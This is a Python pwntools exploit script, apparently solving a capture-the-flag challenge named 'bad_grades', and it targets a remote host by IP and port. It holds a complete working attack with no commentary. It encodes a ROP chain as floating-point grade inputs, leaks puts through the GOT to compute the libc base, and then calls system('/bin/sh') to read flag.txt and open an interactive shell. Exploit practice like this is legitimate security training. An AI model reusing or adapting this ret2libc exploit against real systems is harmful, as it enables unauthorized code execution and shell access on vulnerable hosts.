#!/usr/bin/env python3

from pwn import *

exe = ELF("./bad_grades_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
#p = process()
p = remote('83.136.254.197',54391)
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b': ',b'39')
def fmt(payload):
    p.sendlineafter(b': ',str(struct.unpack('d', p64(payload))[0]))


pop_rdi = 0x0000000000401263

for i in range(35):
    p.sendlineafter(b': ',b'.')

fmt(pop_rdi)
fmt(exe.got.puts)
fmt(exe.plt.puts)
fmt(0x0000000000400FD5)

p.recvline()

leak = u64(p.recv(6).ljust(8,b'\x00'))

libc.address = leak - libc.sym.puts
log.info(f"libc base: {hex(libc.address)}")

p.sendlineafter(b': ',b'39')
for i in range(35):
    p.sendlineafter(b": ",b'.')

fmt(pop_rdi)
fmt(next(libc.search(b'/bin/sh\x00')))
fmt(pop_rdi+1)
fmt(libc.sym.system)

log.success("good!!!")

p.sendline(b'cat flag.txt')




p.interactive()
